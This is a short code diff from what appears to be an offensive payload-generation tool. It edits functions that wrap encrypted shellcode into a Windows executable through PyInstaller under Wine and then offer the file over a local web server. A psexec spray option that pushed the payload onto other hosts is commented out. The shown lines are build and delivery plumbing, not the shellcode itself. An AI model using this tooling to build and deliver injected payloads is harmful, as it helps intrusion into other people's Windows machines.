@@ -77,8 +77,8 @@ def GeneratePayload(ez2read_shellcode, payloadname, shellcode):
         Filesave.write(do_Encryption(injectwindows % (ez2read_shellcode)))
         Filesave.close()
     print('[*] Creating Payload using Pyinstaller...')
-
-    p = subprocess.Popen(['wine', os.path.expanduser('~') + '/.win32/drive_c/Python27/python.exe', '/opt/pyinstaller/pyinstaller.py',
+    pyinstallerLocation = os.path.dirname(__file__).replace('/lib', '/install/pyinstaller/pyinstaller.py')
+    p = subprocess.Popen(['wine', os.path.expanduser('~') + '/.win32/drive_c/Python37/python.exe', pyinstallerLocation,
                           '%s/%s.py' % (payloaddir(), randoFileName), '--noconsole', '--onefile'], env=dict(os.environ, **{'WINEARCH':'win32','WINEPREFIX':os.path.expanduser('~') + '/.win32'}), bufsize=1024, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     LOADING = Spinner('Generating Payload')
     while p.poll() is None:
@@ -105,17 +105,18 @@ def GeneratePayload(ez2read_shellcode, payloadname, shellcode):
 
 
 def CleanUpPayloadMess(randoFileName):
+    print(payloaddir())
     os.system('rm dist -r')
     os.system('rm build -r')
     os.system('rm *.spec')
-    os.system('rm %s/%s.py' % (payloaddir(), randoFileName))
+    #os.system('rm %s/%s.py' % (payloaddir(), randoFileName))
 
 
 def DoPayloadUpload(payloadname):
     from .menu import returnIP
     want_to_upload = input(
         '\n[*] Upload To Local Websever or (p)sexec? [y]/p/n: ')
-    if want_to_upload.lower() == 'p' or want_to_upload.lower() == 'psexec':
-        DoPsexecSpray(payloaddir() + '/' + payloadname + '.exe')
-    elif want_to_upload.lower() == 'y' or want_to_upload.lower() == '':
+    #if want_to_upload.lower() == 'p' or want_to_upload.lower() == 'psexec':
+        #DoPsexecSpray(payloaddir() + '/' + payloadname + '.exe')
+    if want_to_upload.lower() == 'y' or want_to_upload.lower() == '':
         DoServe(returnIP(), payloadname, payloaddir(), port=8000, printIt=True)
